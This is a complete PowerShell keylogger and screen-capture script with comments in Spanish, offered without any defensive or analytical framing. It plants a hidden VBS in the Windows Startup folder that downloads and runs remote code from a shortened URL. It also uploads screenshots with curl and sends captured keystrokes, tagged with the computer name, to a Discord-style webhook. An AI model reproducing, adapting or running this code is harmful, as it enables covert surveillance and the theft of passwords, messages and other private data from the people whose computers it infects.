# shortened URL Detection
if ($dc.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $dc = (irm $dc).url
}

# Crear el archivo de inicio
$startupFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
$wshShellCreation = "Set WshShell = WScript.CreateObject('WScript.Shell')"
$wshShellCreation | Out-File -FilePath $startupFilePath -Force
$wshShellRun = "WshShell.Run 'powershell.exe -WindowStyle Hidden -NoP -Ep Bypass -W H -C `$dc=`"`$dc`"; irm https://is.gd/bw_kl_to_dc | iex'", 0, True"
$wshShellRun | Out-File -FilePath $startupFilePath -Append -Force
Rename-Item -Path $startupFilePath -NewName "init.vbs" -Force

# Importar las definiciones DLL para las entradas de teclado
$keyboardAPI = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Añadir el tipo Win32 al espacio de nombres API
$keyboardAPI = Add-Type -MemberDefinition $keyboardAPI -Name 'Win32' -Namespace API -PassThru

# Intervalo entre capturas de pantalla en segundos
$seconds = 30
# Cantidad de capturas de pantalla a tomar
$a = 1

# Bucle principal para capturar pantallas
While ($a -gt 0) {
    # Ruta del archivo temporal para la captura de pantalla
    $screenshotPath = "$env:temp\SC.png"

    # Importar las bibliotecas necesarias
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing

    # Obtener información sobre la pantalla virtual
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    # Crear un objeto Bitmap y realizar la captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    # Guardar la captura de pantalla en un archivo
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::png)

    # Esperar 1 segundo antes de continuar
    Start-Sleep 1

    # Usar cURL para enviar la captura de pantalla al webhook
    curl.exe -F "file1=@$screenshotPath" $dc

    # Esperar 1 segundo antes de continuar
    Start-Sleep 1

    # Eliminar el archivo de la captura de pantalla
    Remove-Item -Path $screenshotPath

    # Esperar el tiempo especificado antes de la siguiente captura
    Start-Sleep $seconds

    # Decrementar el contador
    $a--
}

# Añadir stopwatch para el envío inteligente
$lastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$keypressThreshold = [TimeSpan]::FromSeconds(10)

# Bucle continuo
While ($true) {
    $keyPressed = $false
    try {
        # Bucle que verifica el tiempo desde la última actividad antes de enviar el mensaje
        while ($lastKeypressTime.Elapsed -lt $keypressThreshold) {
            # Iniciar el bucle con una demora de 30 ms entre las comprobaciones del estado de las teclas
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                # Obtener el estado de la tecla (¿se presionó alguna tecla?)
                $keyst = $keyboardAPI::GetAsyncKeyState($asc)
                # Si se presionó una tecla
                if ($keyst -eq -32767) {
                    # Reiniciar el temporizador de inactividad
                    $keyPressed = $true
                    $lastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    # Traducir el código de tecla a una letra
                    $vtkey = $keyboardAPI::MapVirtualKey($asc, 3)
                    # Obtener el estado del teclado y crear un StringBuilder
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $keyboardAPI::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    # Definir la tecla que se presionó
                    if ($keyboardAPI::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        # Comprobar teclas no alfabéticas
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        # Añadir la tecla a la variable de envío
                        $send += $LString 
                    }
                }
            }
        }
    }
    finally {
        If ($keyPressed) {
            # Enviar las teclas guardadas a un webhook
            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
            # Eliminar el archivo de registro y restablecer la verificación de inactividad
            $send = ""
            $keyPressed = $false
        }
    }
    # Restablecer el cronómetro antes de reiniciar el bucle
    $lastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}